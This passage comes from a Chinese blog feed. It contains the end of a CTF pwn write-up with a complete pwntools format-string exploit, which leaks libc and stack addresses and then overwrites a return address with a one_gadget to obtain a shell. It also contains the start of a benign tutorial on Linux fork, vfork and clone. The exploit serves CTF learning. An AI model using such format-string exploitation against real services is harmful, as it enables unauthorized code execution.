class="line">libc_main_start=<span class="type">int</span>(p.recv(<span class="number">12</span>).rjust(<span class="number">16</span>,b<span class="number">&#x27;0&#x27;</span>),<span class="number">16</span>)<span class="number">-243</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;-0x&quot;</span>)</span><br><span class="line">rbp=<span class="type">int</span>(p.recv(<span class="number">12</span>).rjust(<span class="number">16</span>,b<span class="number">&#x27;0&#x27;</span>),<span class="number">16</span>)<span class="number">-0xe0</span><span class="number">-0x18</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;libc_main:&quot;</span>,hex(libc_main_start))</span><br><span class="line">print(<span class="string">&quot;rbp:&quot;</span>,hex(rbp))</span><br></pre></td></tr></table></figure><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1700229304183-0e9e59e2-a96f-46f5-b43d-09b5515b3ade.png" alt="img"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&quot;What do you want to buy?&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;G&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(b<span class="string">&quot;%&quot;</span>+str(ret1_1).encode()+b<span class="string">&quot;c%13$hn&quot;</span>+b<span class="string">&quot;%2c%29$h</span></span><br></pre></td></tr></table></figure><p>当我们通过_fini__array进入main，我们ret之后会返回一个libc地址，很遗憾这个libc地址和one_gadget还是有点远的。但是我们可以通过下面的两个指针链分别修改两个字节和一个字节就可以达成改libc地址为one_gadget的效果</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1700234608100-4e90bdf1-d5d5-41e4-9441-d88676a41bdd.png" alt="img"></p><p>第二次执行main时，如图</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1700234871072-45d26ef1-ef3a-4abd-b944-93ac6cb4cae2.png" alt="img"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&#x27;Today the store is on sale, do you want to shop?&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;What do you want to buy?&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;G&#x27;</span>)</span><br><span class="line">print(<span class="string">&quot;libc_main:&quot;</span>,hex(libc_main_start))</span><br><span class="line">print(<span class="string">&quot;rbp:&quot;</span>,hex(rbp))</span><br><span class="line">print(<span class="string">&quot;libcbase&quot;</span>,hex(libcbase))</span><br><span class="line">print(<span class="string">&quot;ret1:&quot;</span>,hex(ret1))</span><br><span class="line">print(<span class="string">&quot;one0&quot;</span>,hex(one0),hex(one[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(b<span class="number">&#x27;</span>%<span class="string">&#x27;+str(one0_0).encode()+b&quot;c%71$hhn%&quot;+str(one0-one0_0).encode()+b&quot;c%69$hn&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">p.recvuntil(&quot;What do you want to buy?&quot;)</span></span><br><span class="line"><span class="string">p.sendline(&#x27;</span>G<span class="number">&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;%p&quot;</span>)</span><br></pre></td></tr></table></figure><p>之后改成功了</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1700235072125-db438462-1ea8-4a4e-98cb-333dc797eb80.png" alt="img"></p><h3 id="0X3-EXP"><a href="#0X3-EXP" class="headerlink" title="0X3 EXP"></a>0X3 EXP</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line"><span class="title function_">context</span><span class="params">(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span></span><br><span class="line"><span class="meta">#p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,29649)</span></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x00400c83</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">mprotect_3=<span class="number">0x40127f</span></span><br><span class="line">ret = <span class="number">0x4015B4</span></span><br><span class="line"></span><br><span class="line">setone_offset=<span class="number">8</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Today the store is on sale, do you want to shop?&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line"></span><br><span class="line">one=[<span class="number">0xe3afe</span>,<span class="number">0xe3b01</span>,<span class="number">0xe3b04</span>]</span><br><span class="line">#################<span class="meta">#</span></span><br><span class="line"><span class="meta">p.recvuntil(<span class="string">&quot;What do you want to buy?&quot;</span>)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;G&#x27;</span>)</span><br><span class="line">p.send(b<span class="number">&#x27;</span>%<span class="number">150</span>c%<span class="number">8</span>$hhn+%<span class="number">11</span>$p-%<span class="number">13</span>$p<span class="number">&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;+0x&quot;</span>)</span><br><span class="line">libc_main_start=<span class="type">int</span>(p.recv(<span class="number">12</span>).rjust(<span class="number">16</span>,b<span class="number">&#x27;0&#x27;</span>),<span class="number">16</span>)<span class="number">-243</span></span><br><span class="line">libcbase=libc_main_start<span class="number">-0x23f90</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;-0x&quot;</span>)</span><br><span class="line">rbp=<span class="type">int</span>(p.recv(<span class="number">12</span>).rjust(<span class="number">16</span>,b<span class="number">&#x27;0&#x27;</span>),<span class="number">16</span>)<span class="number">-0xe0</span><span class="number">-0x18</span></span><br><span class="line">ret=rbp+<span class="number">8</span></span><br><span class="line">print(<span class="string">&quot;libc_main:&quot;</span>,hex(libc_main_start))</span><br><span class="line">print(<span class="string">&quot;rbp:&quot;</span>,hex(rbp))</span><br><span class="line">print(<span class="string">&quot;libcbase&quot;</span>,hex(libcbase))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">3</span>):</span><br><span class="line">one[i]+=libcbase</span><br><span class="line"></span><br><span class="line">ret1=ret<span class="number">-0xe0</span></span><br><span class="line">ret1_1=ret1 %<span class="number">0X10000</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;ret1:&quot;</span>,hex(ret1))</span><br><span class="line">one0=one[<span class="number">0</span>]&amp;<span class="number">0xffff</span></span><br><span class="line">one0_0=one[<span class="number">0</span>]&gt;&gt;<span class="number">16</span> &amp;<span class="number">0xff</span></span><br><span class="line">one1=one[<span class="number">1</span>]&amp;<span class="number">0xffff</span></span><br><span class="line">one2=one[<span class="number">2</span>]&amp;<span class="number">0xffff</span></span><br><span class="line">#####################<span class="meta">#</span></span><br><span class="line"><span class="meta">p.recvuntil(<span class="string">&quot;What do you want to buy?&quot;</span>)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;G&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(b<span class="string">&quot;%&quot;</span>+str(ret1_1).encode()+b<span class="string">&quot;c%13$hn&quot;</span>+b<span class="string">&quot;%2c%29$hn&quot;</span>)</span><br><span class="line"></span><br><span class="line">############################## FINI_ARRAY</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Today the store is on sale, do you want to shop?&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;What do you want to buy?&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;G&#x27;</span>)</span><br><span class="line">print(<span class="string">&quot;libc_main:&quot;</span>,hex(libc_main_start))</span><br><span class="line">print(<span class="string">&quot;rbp:&quot;</span>,hex(rbp))</span><br><span class="line">print(<span class="string">&quot;libcbase&quot;</span>,hex(libcbase))</span><br><span class="line">print(<span class="string">&quot;ret1:&quot;</span>,hex(ret1))</span><br><span class="line">print(<span class="string">&quot;one0&quot;</span>,hex(one0),hex(one[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line"><span class="meta">#gdb.attach(p)</span></span><br><span class="line">p.sendline(b<span class="number">&#x27;</span>%<span class="string">&#x27;+str(one0_0).encode()+b&quot;c%71$hhn%&quot;+str(one0-one0_0).encode()+b&quot;c%69$hn&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">p.recvuntil(&quot;What do you want to buy?&quot;)</span></span><br><span class="line"><span class="string">p.sendline(&#x27;</span>G<span class="number">&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;%p&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x4-小结"><a href="#0x4-小结" class="headerlink" title="0x4 小结"></a>0x4 小结</h3><p>应用这两个链改三字节是没想到的，学习</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1700234608100-4e90bdf1-d5d5-41e4-9441-d88676a41bdd.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> ctfwp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctfwp </tag>
            
            <tag> 2023wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>紫禁城之殇</title>
      <link href="/2024/10/28/%E7%B4%AB%E7%A6%81%E5%9F%8E%E4%B9%8B%E6%AE%87/"/>
      <url>/2024/10/28/%E7%B4%AB%E7%A6%81%E5%9F%8E%E4%B9%8B%E6%AE%87/</url>
      
        <content type="html"><![CDATA[<p>参考：<a href="https://blog.csdn.net/z961968549/article/details/80189737#:~:text=%E5%BD%93%E6%9F%90%E4%B8%AA%E8%BF%9B%E7%A8%8B%E6%94%B6%E5%88%B0%E4%BF%A1%E5%8F%B7%E6%97%B6#:~:text=%E5%BD%93%E6%9F%90%E4%B8%AA%E8%BF%9B%E7%A8%8B%E6%94%B6%E5%88%B0%E4%BF%A1%E5%8F%B7%E6%97%B6">linux进程相关函数(获取、销毁、切换···)_储处理器执行的代码-CSDN博客</a></p><p>参考：<a href="https://blog.csdn.net/gogokongyin/article/details/51178257">fork()、vfork()、clone()的区别_linux clone fork-CSDN博客</a></p><h1 id="0x1-从C函数走进子进程"><a href="#0x1-从C函数走进子进程" class="headerlink" title="0x1 从C函数走进子进程"></a>0x1 从C函数走进子进程</h1><h2 id="1-1-进程有关概念"><a href="#1-1-进程有关概念" class="headerlink" title="1.1 进程有关概念"></a>1.1 进程有关概念</h2><h3 id="1-1-1-进程"><a href="#1-1-1-进程" class="headerlink" title="1.1.1 进程"></a>1.1.1 进程</h3><p>程序是指存放指令的文件，存放在磁盘上，它是固定不变的，保存着指令的有序集合</p><p>进程是动起来的概念，可以理解成动起来的程序。（回头看看程序员自我修养是如何解释的）</p><p>进程时程序的执行过程，它一般分为三种状态：</p><p><strong>执行态</strong>：该进程正在运行，即正在使用CPU</p><p><strong>就绪态</strong>：该进程已经具备执行的一切条件，正在等待分配CPU的处理</p><p><strong>等待态</strong>：进程不能使用CPU，若等待事件发生（等待的资源分配到自身），将其唤醒。</p><p>进程的标识号是pid，它来区分不同的进程。</p><p>进程0调度进程时，常被称为交换进程，他不执行任何程序，是内核的一部分，因此被称为系统进程。进程除了自身ID外，还有父进程ID，每个进程都有一个父进程，操作系统不会无缘无故产生一个新进程<strong>。所有进程的祖先进程都是同一个进程叫做init进程，进程号是1。init进程是内核自举后的第一个启动进程</strong></p><p>iniit进程负责引导系统、启动守护（后台）进程并且运行必要的程序。<strong>它不是系统进程但是它以系统的超级用户特权运行。</strong></p><p><strong>父进程负责子进程空间的清理</strong></p><p><strong>并发</strong>：宏观上来看，只是因为执行速度快，看起来所有事情同时发生</p><p><strong>并行</strong>：同时执行，微观上真的同时执行，多个CPU同时执行不同的进程，多个进程真的在同时执行。</p><p><strong>同步</strong>：相同的步伐，进程间相互联系，或者共同完成某件事，需要相互协调</p><p><strong>异步</strong>：不同的步伐，进程间毫无关联。</p><p>从参考文献中读到这么一句话，发现对进程的描述很恰当。</p><p>Linux中，一个人在炒菜，快递打电话来了，让这个人去取快递，他可以叫他的儿子去取快递，自己继续炒菜。从CPU角度来想，由于CPU执行速度较快，看起来任务同时进行（并发进行），这样所有的事情都不耽误，这就是进程的意义。</p><h3 id="1-1-2-进程和线程的区别？"><a href="#1-1-2-进程和线程的区别？" class="headerlink" title="1.1.2 进程和线程的区别？"></a>1.1.2 进程和线程的区别？</h3><p>​      进程的四要素：</p><p>​       （1）有一段程序供其执行（不一定是一个进程所专有的），就像一场戏必须有自己的剧本。<br>​       （2）有自己的专用系统堆栈空间（私有财产）<br>​       （3）有进程控制块（task_struct）（“有身份证，PID”）<br>​       （4）有独立的存储空间。<br>​          缺少第四条的称为线程，如果完全没有用户空间称为内核线程，共享用户空间的称为用户线</p><h2 id="1-2-从C语言函数出发"><a href="#1-2-从C语言函数出发" class="headerlink" title="1.2 从C语言函数出发"></a>1.2 从C语言函数出发</h2><hr><h3 id="1-2-1-获取进程ID"><a href="#1-2-1-获取进程ID" class="headerlink" title="1.2.1 获取进程ID"></a>1.2.1 获取进程ID</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">pid_t</span> <span class="title">getpid</span><span class="params">(<span class="type">void</span>)</span></span>; </span><br></pre></td></tr></table></figure><p><strong>功能：</strong>获取自己的进程<code>ID</code>号<br><strong>参数：</strong>无<br><strong>返回值：</strong>本进程的<code>ID</code>号</p><hr><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">pid_t</span> <span class="title">getppid</span><span class="params">(<span class="type">void</span>)</span></span>;</span><br></pre></td></tr></table></figure><p><strong>功能：</strong>获取自己的父进程<code>ID</code>号<br><strong>参数：</strong>无<br><strong>返回值：</strong>本进程的父进程的<code>ID</code>号</p><hr><h3 id="1-2-2-创建进程"><a href="#1-2-2-创建进程" class="headerlink" title="1.2.2 创建进程"></a>1.2.2 创建进程</h3><p>创建进程主要有三个函数fork vfork clone它们其实都是linux的系统调用，这三个函数分别调用了sys_fork、sys_vfork、sys_clone最终都调用了do_fork函数，差别在于参数的传递和一些基本的准备工作不同。</p><h4 id="1-2-2-1-fork"><a href="#1-2-2-1-fork" class="headerlink" title="1.2.2.1 fork"></a>1.2.2.1 fork</h4><p>生成一个进程，实际上是把父进程的资源task_struct，除了进程号。</p><p>fork只调用一次，但是会在父进程和子进程中分别返回两次，<strong>父进程中返回所创建子进程的pid</strong>，<strong>子进程中返回0</strong>。在fork()结束后，<strong>父进程和子进程的执行顺序不确定（基本是同步运行）</strong>，由高度程序决定谁先执行。<strong>不过可以在父进程中调用wait(）等待子进程结束。</strong></p><p>说到fork，得提到写时拷贝技术</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1725447425374-34f85d01-61b6-41b4-993d-3739f43bc4f8.jpeg" alt="img"></p><p>我们都知道fork创建进程的时候，并没有真正的copy内存，因为对于fork来说，有一个exec系列的系统调用，它会勾引子进程另起炉灶。为了不让copy内存造成效率降低，linux引入了“写时复制技术”</p><p>换而言之，fork()之后exec之前两个进程用的是相同的物理空间（代码段、数据段、堆栈，仅仅是虚拟空间不同）。当父进程中有更改相应段的行为发生，如果不是因为exec产生，内核会给子进程的相应位置分配物理空间，但是代码段继续共享父进程的物理空间。如果是因为exec，由于两者执行的代码不同，子进程代码段也会分配单独的物理空间。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fork()) &#123;               <span class="comment">/* parent */</span></span><br><span class="line">        <span class="built_in">wait</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;In parent\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;                    <span class="comment">/* child */</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;In child\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h4 id="1-2-2-2-vfork"><a href="#1-2-2-2-vfork" class="headerlink" title="1.2.2.2 vfork"></a>1.2.2.2 vfork</h4><p>我们从vfork()的产生原因来理解它会比较容易，因为fork()操作会将当前进程的任何资源几乎完全复制一份，其中包括了地址空间。一般fork()调用后都会跟着调用execve()，用新的内存镜像取代原来的内存镜像，当地址空间很大的时候，复制的操作会很费时，而且又是无用功，所以就产生了vfork。</p><p><code>vfork()</code>产生的子进程与父进程共享地址空间（代码段，数据段，堆栈），就没有了复制产生的开销。而且pid也是相同的。<br><code>vfork()</code>保证父进程在子进程调用<code>execve()</code>或<code>exit()</code>之前不会执行。</p><p>创建出来的进程不是真正意义上的进程，而是一个线程</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;count before fork = %d\n&quot;</span>, count);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">vfork</span>()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;In parent: count = %d\n&quot;</span>, count);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;In child:  count = %d\n&quot;</span>, ++count);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意程序不能使用<code>return</code>语句退出（至少子进程不能使用），原因我猜测是<br><code>return</code>语句会使得<code>main</code>函数的栈被清空，因为是使用的同一个内存空间，子进程<br>把栈清空后，父进程的栈就被破坏了，于是就出错了。使用<code>exit()</code>可以避免这个问题。</p><h4 id="1-2-2-3-clone"><a href="#1-2-2-3-clone" class="headerlink" title="1.2.2.3 clone()"></a>1.2.2.3 clone()</h4><p>clone（）可以更细粒度与子进程共享资源，因而参数也更复杂，函数原型如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">clone</span><span class="params">(<span class="type">int</span> (*fn)(<span class="type">void</span> *), <span class="type">void</span> *child_stack,</span></span></span><br><span class="line"><span class="params"><span class="function">          <span class="type">int</span> flags, <span class="type">void</span> *arg, ...</span></span></span><br><span class="line"><span class="params"><span class="function">          <span class="comment">/* pid_t *ptid, struct user_desc *tls, pid_t *ctid */</span> )</span></span>;</span><br></pre></td></tr></table></figure><p>根据man 2 clone上的描述，这个原型并不是最底层的调用，而是封装过的。</p><p>这里第一个参数fn是函数指针，我们知道进程的4要素，这个就是指向程序的指针，就是“剧本”</p><p>child_stack明显是为子进程分配系统堆栈空间（在linux下系统堆栈空间是2页面，就是8K的内存，其中在这块内存中，低地址上放入了值，这个值就是进程控制块task_struct的值），flags就是标志用来描述你需要从父进程继承那些资源， arg就是传给子进程的参数）。下面是flags可以取的值</p><table><thead><tr><th><strong>标志</strong></th><th><strong>含义</strong></th></tr></thead><tbody><tr><td>CLONE_PARENT</td><td>创建的子进程的父进程是调用者的父进程，新进程与创建它的进程成了“兄弟”而不是“父子”</td></tr><tr><td>CLONE_FS</td><td>子进程与父进程共享相同的文件系统，包括root、当前目录、umask</td></tr><tr><td>CLONE_FILES</td><td>子进程与父进程共享相同的文件描述符（file descriptor）表</td></tr><tr><td>CLONE_NEWNS</td><td>在新的namespace启动子进程，namespace描述了进程的文件hierarchy</td></tr><tr><td>CLONE_SIGHAND</td><td>子进程与父进程共享相同的信号处理（signal handler）表</td></tr><tr><td>CLONE_PTRACE</td><td>若父进程被trace，子进程也被trace</td></tr><tr><td>CLONE_VFORK</td><td>父进程被挂起，直至子进程释放虚拟内存资源</td></tr><tr><td>CLONE_VM</td><td>子进程与父进程运行于相同的内存空间</td></tr><tr><td>CLONE_PID</td><td>子进程在创建时PID与父进程一致</td></tr><tr><td>CLONE_THREAD</td><td>Linux 2.4中增加以支持POSIX线程标准，子进程与父进程共享相同的线程群</td></tr></tbody></table><p>下面的例子是创建一个线程（子进程共享了父进程虚存空间，没有自己独立的虚存空间不能称其为进程）。父进程被挂起当子线程释放虚存资源后再继续执行。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FIBER_STACK 8192</span></span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="type">void</span> * stack;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">do_something</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This is son, the pid is:%d, the a is: %d\n&quot;</span>, <span class="built_in">getpid</span>(), ++a);</span><br><span class="line">    <span class="built_in">free</span>(stack); <span class="comment">//这里我也不清楚，如果这里不释放，不知道子线程死亡后，该内存是否会释放，知情者可以告诉下,谢谢</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">void</span> * stack;</span><br><span class="line">    a = <span class="number">1</span>;</span><br><span class="line">    stack = <span class="built_in">malloc</span>(FIBER_STACK);<span class="comment">//为子进程申请系统堆栈</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!stack)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The stack failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;creating son thread!!!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">clone</span>(&amp;do_something, (<span class="type">char</span> *)stack + FIBER_STACK, CLONE_VM|CLONE_VFORK, <span class="number">0</span>);<span class="comment">//创建子线程</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This is father, my pid is: %d, the a is: %d\n&quot;</span>, <span class="built_in">getpid</span>(), a);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1725449684249-0afc3bac-80fa-4891-a4ca-8d52230e81f1.jpeg" alt="img"></p><hr><h2 id="1-3-出发的转折点"><a href="#1-3-出发的转折点" class="headerlink" title="1.3 出发的转折点"></a>1.3 